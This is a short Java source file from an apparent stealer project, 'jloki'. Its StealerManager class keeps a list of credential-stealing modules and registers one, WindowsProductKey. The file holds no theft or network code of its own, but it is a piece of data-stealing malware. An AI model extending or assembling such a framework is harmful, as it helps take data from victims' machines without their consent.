package me.jershdervis.jloki.steal;

import me.jershdervis.jloki.steal.stealers.WindowsProductKey;

import java.util.ArrayList;

/**
 * Created by JershDervis on 28/07/2015.
 */
public class StealerManager {

    private ArrayList<Stealer> stealerArrayList = new ArrayList<Stealer>();

    public StealerManager() {
        this.stealerArrayList.add(new WindowsProductKey());
    }

    public ArrayList<Stealer> getStealerArrayList() {
        return this.stealerArrayList;
    }
}
